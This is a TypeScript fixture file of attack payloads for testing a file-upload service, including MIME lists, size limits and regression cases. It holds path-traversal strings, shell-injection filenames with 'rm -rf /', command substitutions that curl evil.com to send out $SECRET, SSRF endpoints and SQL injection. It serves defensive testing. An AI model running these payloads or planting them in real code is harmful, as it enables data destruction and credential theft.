/**
 * Security Test Data Artifacts
 * Attack simulation payloads for security testing
 */

export const ATTACK_PAYLOADS = {
  // Path Traversal Attacks
  pathTraversal: [
    '../../../etc/passwd',
    '../../sensitive/config.env',
    '../.env',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '/etc/shadow',
    '/root/.ssh/id_rsa',
    'C:\\Windows\\System32\\config\\SAM',
    'file.txt\x00.exe',
    'file.pdf\x00../../../etc/passwd',
    '\u002e\u002e/\u002e\u002e/etc/passwd',
    '%2e%2e%2f%2e%2e%2fconfig',
    '..%252f..%252fetc%252fpasswd',
    'uploads/../../../etc/passwd',
    'uploads/../../config.env'
  ],

  // Malicious Filenames
  shellInjection: [
    'file;rm -rf /.txt',
    'file$(whoami).txt',
    'file`id`.txt',
    'file|cat /etc/passwd.txt',
    'file&& echo pwned.txt',
    'file\ncurl evil.com\n.txt',
    'file && curl http://attacker.com',
    '$(curl http://evil.com).txt'
  ],

  // Special Characters
  specialChars: [
    'file\u200Bwith\u200Bzero\u200Bwidth.txt',
    'RTL\u202Eexe.txt',
    'file<script>alert(1)</script>.txt',
    'file\r\n\r\nHTTP/1.1 200 OK\r\n.txt',
    'CON.txt', // Windows reserved
    'PRN.txt', // Windows reserved
    'AUX.txt', // Windows reserved
    'NUL.txt', // Windows reserved
    'file:stream.txt', // NTFS alternate data stream
    'file\x00hidden.exe'
  ],

  // Long Filenames
  longNames: [
    'a'.repeat(300) + '.txt',
    'a'.repeat(500) + '.pdf',
    'a'.repeat(1000) + '.jpg',
    'deeply/nested/path/structure/' + 'dir/'.repeat(50) + 'file.txt'
  ],

  // Extension Spoofing
  extensionSpoofing: [
    'document.pdf.exe',
    'image.jpg.js',
    'data.csv.bat',
    'archive.zip.sh',
    'photo.png.cmd',
    'file.txt.vbs',
    'document.docx.scr'
  ],

  // Unicode and Encoding
  unicodeAttacks: [
    '文档.txt',
    'документ.pdf',
    'ملف.jpg',
    'ファイル.png',
    '\u202Eexe.txt', // RTL override
    'file\uFEFF.txt', // Zero-width no-break space
    'test\u200D\u200Cfile.txt', // Zero-width joiner/non-joiner
    '\u2028\u2029newline.txt' // Line/paragraph separators
  ],

  // Empty and Null
  emptyInputs: [
    '',
    '   ',
    '\t\t\t',
    '\n\n\n',
    '.',
    '..',
    '...',
    '....'
  ],

  // SQL Injection (in filename context)
  sqlInjection: [
    "file'; DROP TABLE users; --.txt",
    "file' OR '1'='1.txt",
    "file\"; DELETE FROM uploads; --.txt"
  ]
};

export const MALICIOUS_MIME_TYPES = {
  executables: [
    'application/x-executable',
    'application/x-dosexec',
    'application/x-msdownload',
    'application/x-msdos-program',
    'application/vnd.microsoft.portable-executable',
    'application/x-elf',
    'application/x-mach-binary'
  ],

  scripts: [
    'application/javascript',
    'application/x-javascript',
    'text/javascript',
    'application/x-sh',
    'application/x-python-code',
    'application/x-perl',
    'application/x-ruby',
    'text/x-shellscript'
  ],

  archives: [
    'application/x-gzip',
    'application/x-bzip2',
    'application/x-tar',
    'application/x-7z-compressed'
  ],

  invalid: [
    'invalid',
    'text',
    'application/',
    '/subtype',
    'text//plain',
    '',
    'text/plain;charset=utf-8; extra=malicious',
    '../application/pdf'
  ]
};

export const ALLOWED_MIME_TYPES = [
  'application/pdf',
  'image/jpeg',
  'image/png',
  'image/gif',
  'image/webp',
  'text/plain',
  'text/csv',
  'application/json',
  'application/xml',
  'text/xml',
  'application/vnd.ms-excel',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  'application/msword',
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
];

export const FILE_SIGNATURES = {
  // Magic bytes for file type detection
  pdf: [0x25, 0x50, 0x44, 0x46], // %PDF
  jpeg: [0xFF, 0xD8, 0xFF],
  png: [0x89, 0x50, 0x4E, 0x47],
  gif: [0x47, 0x49, 0x46, 0x38],
  zip: [0x50, 0x4B, 0x03, 0x04],
  exe: [0x4D, 0x5A], // MZ
  elf: [0x7F, 0x45, 0x4C, 0x46] // ELF
};

export const ENVIRONMENT_ATTACKS = {
  bucketInjection: [
    'bucket; rm -rf /',
    'bucket && curl evil.com',
    'bucket`whoami`',
    '../../../etc',
    'bucket/../other',
    'bucket\x00evil',
    'bucket\nls -la',
    'bucket$(cat /etc/passwd)'
  ],

  endpointInjection: [
    'http://evil.com',
    'http://localhost:22',
    'file:///etc/passwd',
    'ftp://attacker.com',
    'http://169.254.169.254/latest/meta-data/' // AWS metadata
  ],

  credentialInjection: [
    'key; export SECRET=stolen',
    'key`curl http://evil.com?data=$SECRET`',
    'key\nwget http://evil.com',
    'key && echo pwned'
  ]
};

export const BOUNDARY_TEST_CASES = {
  fileSizes: {
    zero: 0,
    small: 1024, // 1KB
    medium: 1024 * 1024, // 1MB
    large: 50 * 1024 * 1024, // 50MB
    atLimit: 100 * 1024 * 1024, // 100MB
    overLimit: 101 * 1024 * 1024, // 101MB
    wayOver: 500 * 1024 * 1024 // 500MB
  },

  fileCount: {
    zero: 0,
    one: 1,
    few: 5,
    many: 19,
    atLimit: 20,
    overLimit: 21,
    excessive: 100
  },

  nameLengths: {
    empty: 0,
    short: 10,
    normal: 50,
    long: 200,
    atLimit: 255,
    overLimit: 256,
    excessive: 1000
  }
};

export const REGRESSION_TEST_DATA = {
  // Valid uploads that should always work
  validUploads: [
    { name: 'document.pdf', size: 1024, type: 'application/pdf' },
    { name: 'photo.jpg', size: 2048, type: 'image/jpeg' },
    { name: 'image.png', size: 1536, type: 'image/png' },
    { name: 'data.json', size: 512, type: 'application/json' },
    { name: 'report.txt', size: 256, type: 'text/plain' }
  ],

  // Edge cases that should be handled
  edgeCases: [
    { name: 'file.tar.gz.backup', size: 1024, type: 'application/gzip' },
    { name: 'data.2024.csv', size: 512, type: 'text/csv' },
    { name: 'file-with-dashes.txt', size: 256, type: 'text/plain' },
    { name: 'file_with_underscores.pdf', size: 1024, type: 'application/pdf' },
    { name: 'UPPERCASE.TXT', size: 128, type: 'text/plain' },
    { name: 'lowercase.txt', size: 128, type: 'text/plain' },
    { name: 'MixedCase.Txt', size: 128, type: 'text/plain' }
  ]
};

export const PERFORMANCE_TEST_DATA = {
  // Scenarios for performance testing with security
  scenarios: [
    {
      name: 'Small batch with validation',
      fileCount: 5,
      fileSize: 1024,
      expectedMaxDuration: 500
    },
    {
      name: 'Medium batch with validation',
      fileCount: 10,
      fileSize: 1024,
      expectedMaxDuration: 1000
    },
    {
      name: 'Large batch with validation',
      fileCount: 20,
      fileSize: 1024,
      expectedMaxDuration: 2000
    },
    {
      name: 'Large files with validation',
      fileCount: 5,
      fileSize: 10 * 1024 * 1024,
      expectedMaxDuration: 5000
    }
  ]
};
